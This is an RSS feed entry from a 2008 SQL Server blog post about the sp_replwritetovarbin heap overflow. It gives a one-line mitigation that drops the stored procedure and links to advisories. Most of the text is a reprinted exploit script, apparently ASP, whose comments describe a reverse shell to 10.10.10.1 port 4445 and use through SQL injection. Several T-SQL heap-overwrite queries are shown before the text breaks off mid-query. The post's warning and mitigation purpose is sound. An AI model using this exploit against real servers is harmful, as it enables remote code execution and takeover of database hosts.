<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>heap overflow &#8211; LessthanDot</title>
	<atom:link href="/index.php/tag/heap-overflow/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>A Technical Community for IT Professionals</description>
	<lastBuildDate>Sat, 09 Mar 2019 12:50:36 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>hourly</sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
	<generator>https://wordpress.org/?v=4.6.1</generator>
	<item>
		<title>sp_replwritetovarbin Heap Overflow Code Exploit Code In The Wild, Works By Using Our Good Friend SQL Injection</title>
		<link>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/</link>
		<comments>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/#comments</comments>
		<pubDate>Tue, 23 Dec 2008 11:50:40 +0000</pubDate>
		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
				<category><![CDATA[Data Modelling and Design]]></category>
		<category><![CDATA[heap overflow]]></category>
		<category><![CDATA[security]]></category>
		<category><![CDATA[sql injection]]></category>
		<category><![CDATA[sql server 2000]]></category>
		<category><![CDATA[sql server 2005]]></category>

		<guid isPermaLink="false">/index.php/2008/12/sp_replwritetovarbin-heap-overflow-code/</guid>
		<description><![CDATA[There is code available to take advantage of the sp_replwritetovarbin heap overflow bug In a default configuration, the sp_replwritetovarbin stored procedure is accessible by anyone. To disable this proc you can run this as an admin on the box Before disabling this pro read BradC&#8217;s comment so that you do not break replication T-SQL1 execute [&#8230;]]]></description>
				<content:encoded><![CDATA[<p>There is code available to take advantage of the sp_replwritetovarbin heap overflow bug<br />
In a default configuration, the sp_replwritetovarbin stored procedure is accessible by anyone. To disable this proc you can run this as an admin on the box<br />
Before disabling this pro read BradC&#8217;s comment so that you do not break replication</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
</pre></td><td class="de1"><pre class="de1"><span class="kw1">execute</span> master.<span class="me1">dbo</span>.<span class="kw3">sp_dropextendedproc</span> <span class="st0">'sp_replwritetovarbin'</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">execute master.dbo.sp_dropextendedproc 'sp_replwritetovarbin'</pre></div></div>

<p>Microsoft is investigating new public reports of a vulnerability that could allow remote code execution on systems with supported editions of Microsoft SQL Server 2000, Microsoft SQL Server 2005, Microsoft SQL Server 2005 Express Edition, Microsoft SQL Server 2000 Desktop Engine (MSDE 2000), Microsoft SQL Server 2000 Desktop Engine (WMSDE), and Windows Internal Database (WYukon). Systems with Microsoft SQL Server 7.0 Service Pack 4, Microsoft SQL Server 2005 Service Pack 3, and Microsoft SQL Server 2008 are not affected by this issue.</p>
<p>Here are some more links<br />
http://www.microsoft.com/technet/security/advisory/961040.mspx<br />
http://www.sec-consult.com/files/20081209_mssql-sp_replwritetovarbin_memwrite.txt<br />
http://msdn.microsoft.com/en-us/library/aa215995(SQL.80).aspx</p>
<p>Here is the code someone emailed me to test for the exploit </p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="vb"><thead><tr><td colspan="2"  class="head">Visual Basic</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
</pre></td><td class="de1"><pre class="de1">// k`sOSe 12/17/2008
&lt;%// Microsoft SQL Server <span class="st0">&quot;sp_replwritetovarbin()&quot;</span> Heap Overflow
// Tested <span class="kw4">on</span> Win2k SP4 <span class="kw3">with</span> MSSQL 2000(<span class="kw4">on</span> one box only!).
// Shellcode <span class="kw3">is</span> a slightly modified metasploit reverse shell(<span class="kw4">on</span> 10.10.10.1 port 4445),
// the change allows multiple shots <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" />
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.
&nbsp;
// Take a look at the comments <span class="kw3">in</span> T-SQL
&nbsp;
&nbsp;
&nbsp;
<span class="kw4">On</span> <span class="kw4">Error</span> <span class="kw4">Resume</span> <span class="kw3">Next</span>
&nbsp;
// change this
UserName = <span class="st0">&quot;r00t&quot;</span>
Password = <span class="st0">&quot;t00r&quot;</span>
&nbsp;
// ########################################### FIRST QUERY
SQL = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000), &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3020&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* First byte overwritten here. This is a random writable address */&nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### SECOND QUERY
SQL2 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3097&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Second byte overwritten here */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### THIRD QUERY
SQL3 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3021&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Third byte overwritten here */ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
&nbsp;
&nbsp;
&nbsp;
// ########################################### FOURTH QUERY
SQL4 = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 2708&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
